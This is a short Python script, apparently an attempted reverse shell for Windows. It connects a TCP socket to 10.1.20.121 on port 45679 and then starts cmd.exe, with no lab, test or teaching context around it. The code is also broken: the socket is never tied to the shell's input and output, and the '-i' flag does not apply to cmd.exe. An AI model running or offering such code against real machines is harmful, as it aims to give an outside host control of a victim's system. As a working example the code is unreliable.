import socket
import os
import subprocess


socket_handler=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

socket_handler.connect(("10.1.20.121",45679))
shell_remote=subprocess.call(["C:\Windows\System32\cmd.exe","-i"])



